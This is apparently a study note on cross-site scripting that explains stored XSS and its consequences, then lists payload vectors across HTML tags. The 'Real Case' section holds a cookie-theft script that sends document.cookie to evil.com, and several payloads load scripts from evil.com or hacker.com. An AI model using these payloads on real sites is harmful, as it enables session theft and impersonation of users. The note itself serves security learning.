# Cross Site Scripting
* Attacker inject malicious script (malicious payload) to target Web App
* User download and execute the malicious script.

## Overview
* web app use unvalidated or unencoded user input within the output it generates.
* Using the vulnerable website as a vehicle to deliver a malicious script to the victim’s browser.

* Vulnerable Website.
  * Use e.target.value from input directly without any validation and encode.


## How: step by step
1. Hacker inject malicious payload into vulnerable website (PRO360). Or hacker can create a malicious website with malicious payload then lure victim to visit the website.
2. Hacker put code string in input.

```js
print "<html>"
print "<h1>Most recent comment</h1>"
print database.latestComment
print "</html>"
```

3. say the database.latestComment just printout the comment that store from the input of comment page
4. Hacker tpye <script>doSomethingEvil();</script> in the input page and store it.
5. Next time user load webpage will be like following

```js
<html>
<h1>Most recent comment</h1>
<script>doSomethingEvil();</script>
</html>

```

## Consequences
1. Script can access to all objects of the page (documents)
 * Access cookies to get sessionId (token), JWT,  
 * Impersonate user
2. Make arbitrary modifications of browser's DOM
3. use XMLHttpRequest to send HTTP requests with arbitrary content to arbitrary destinations.
4. JavaScript in modern browsers can leverage HTML5 APIs such as accessing a user’s geolocation, webcam, microphone and even the specific files from the user’s file system. While most of these APIs require user opt-in, XSS in conjunction with some clever social engineering can bring an attacker a long way.

## Real Case
* Attacker's Goal: Impersonate user, steal it's cookie and send it to attacker's own sever.

```js

// malicious code
<script>
   window.location=“http://evil.com/?cookie=” + document.cookie
</script>

```

<img src="./assets/how-xss-works.png">

1. The attacker injects a payload in the website’s database by submitting a vulnerable form with some malicious JavaScript
2. The victim requests the web page from the website
3. The website serves the victim’s browser the page with the attacker’s payload as part of the HTML body.
4. The victim’s browser will execute the malicious script inside the HTML body. In this case it would send the victim’s cookie to the attacker’s server. The attacker now simply needs to extract the victim’s cookie when the HTTP request arrives to the server, after which the attacker can use the victim’s stolen cookie for impersonation.

## XSS Payload Examples
1. script
```js
<!-- External script -->
<script src=http://evil.com/xss.js></script>
<!-- Embedded script -->
<script> alert("XSS"); </script>
```

2. body

```js
<!-- onload attribute -->
<body onload=alert("XSS")>
<!-- background attribute -->
<body background="javascript:alert("XSS")">
```

3. img
```js
<!-- <img> tag XSS -->
<img src="javascript:alert("XSS");">
<!--  tag XSS using lesser-known attributes -->
<img dynsrc="javascript:alert('XSS')">
<img lowsrc="javascript:alert('XSS')">
```

4. input

```js
<!-- <input> tag XSS -->
<input type="image" src="javascript:alert('XSS');">

```

5. link
```js
<!-- <link> tag XSS -->
<link rel="stylesheet" href="javascript:alert('XSS');">

```

6. table

```js
<!-- <table> tag XSS -->
<table background="javascript:alert('XSS')">
<!-- <td> tag XSS -->
<td background="javascript:alert('XSS')">
```

7. div
```js
<!-- <div> tag XSS -->
<div style="background-image: url(javascript:alert('XSS'))">
<!-- <div> tag XSS -->
<div style="width: expression(alert('XSS'));">
```

8. object
```js
<!-- <object> tag XSS -->
<object type="text/x-scriptlet" data="http://hacker.com/xss.html">
```

9. iframe
* Iframe can not acces the host page's dom due to the browser’s Content Security Policy (CSP).
* IFrames are still very effective means of pulling off phising attacks ????
```js
<!-- <iframe> tag XSS -->
<iframe src=”http://evil.com/xss.html”>

```

## Ref
[Acunetix - XSS](https://www.acunetix.com/websitesecurity/cross-site-scripting/)
